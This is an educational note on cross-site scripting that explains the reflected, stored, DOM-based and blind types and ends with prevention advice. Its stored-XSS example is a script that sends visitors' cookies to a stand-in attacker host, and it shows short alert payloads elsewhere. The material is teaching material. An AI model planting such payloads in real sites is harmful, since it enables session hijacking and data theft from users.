## 📝 What is XSS?

**Cross-Site Scripting (XSS)** is a vulnerability where an attacker injects malicious client-side scripts (usually JavaScript) into a trusted website. When a browser executes this script thinking it originated from the site itself, the attacker can steal session cookies, access sensitive data, or manipulate the page content.

---

## 🚀 Types of XSS

### 1. Reflected XSS (Non-Persistent)

The most common type. The malicious script is "reflected" off a web application to the victim's browser. It is delivered to the victim via a link.

> [!IMPORTANT] Logic
> 
> The script is not stored on the server. The attack occurs when a user clicks a specially crafted link containing the payload.

- **Example Scenario:** A search result page that displays the search term.
    
    `https://site.com/search?q=<script>alert('Reflected')</script>`
    
- **Vector:** Usually found in URL parameters or form inputs.
    

---

### 2. Stored XSS (Persistent)

The most dangerous type. The malicious script is permanently stored on the target server (e.g., in a database).

> [!DANGER] Critical Threat
> 
> No special link is required. **Every user** who visits the affected page will trigger the script automatically.

- **Example Scenario:** Injecting a script into a forum post or a user profile bio.
    
    `Comment: "Great post! <script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>"`
    
- **Vector:** Comment sections, user profiles, message boards, or notification logs.
    

---

### 3. DOM-based XSS (Client-Side)

The vulnerability exists entirely in the **client-side** code. The server is often completely unaware of the attack.

> [!INFO] Source & Sink Concept
> 
> - **Source:** A JavaScript property that accepts user-controlled input (e.g., `location.hash`, `URLSearchParams`).
>     
> - **Sink:** A dangerous JavaScript function that executes or renders that input (e.g., `.innerHTML`, `eval()`, `document.write()`).
>     

- **Why is it different?**
    
    In many cases, the payload is placed after the `#` (fragment) in the URL. Since fragments are not sent to the server, the malicious code never leaves the browser, making it invisible to Server Logs and WAFs (Web Application Firewalls).
    
- **Example Code:**
    
    JavaScript
    
    ```
    // URL: site.com/#name=<img src=x onerror=alert(1)>
    var user = window.location.hash.split('=')[1];
    document.getElementById('welcome').innerHTML = user; // The SINK point
    ```
    

---

### 4. Blind XSS

A subtype of **Stored XSS** where the attacker cannot see the result of the attack immediately (it happens "in the dark").

- **How it Works:** The payload is saved in a backend system (like an Admin Dashboard or Log Viewer) that the attacker cannot access.
    
- **Example Scenario:** An attacker submits a "Contact Us" form with a script. The script executes days later when a System Administrator logs into the private admin panel to read the messages.
    
- **Tracking:** Attackers usually use tools like `XSS Hunter` to receive a "callback" notification when the script is finally triggered.
    

---

## 📊 Comparison Table

|**Feature**|**Reflected**|**Stored**|**DOM-based**|**Blind**|
|---|---|---|---|---|
|**Persistence**|Temporary (Link-based)|Permanent (Database)|Temporary (DOM state)|Permanent (Backend)|
|**Location**|URL Parameters|Comments/Profiles|JS Variables/URL Hash|Admin Panels/Logs|
|**Server Interaction**|Yes|Yes|No (Client-only)|Yes|
|**Primary Target**|Individual clicking link|All visitors|Individual clicking link|System Administrators|

---

## 🛡️ Prevention Strategies

> [!SUCCESS] The Golden Rule
> 
> Never trust user input. Period.

1. **Output Encoding:** Convert user-supplied data into a safe form before rendering (e.g., convert `<` to `&lt;`).
    
2. **Input Validation:** Validate input against a strict allow-list (e.g., ensuring an age field only contains numbers).
    
3. **Content Security Policy (CSP):** Use HTTP headers to restrict which scripts can execute and from which sources.
    
4. **HttpOnly Cookies:** Prevent JavaScript from accessing session cookies by setting the `HttpOnly` flag.
    
5. **Use Safe APIs:** Prefer `.textContent` over `.innerHTML` to prevent the browser from interpreting input as HTML.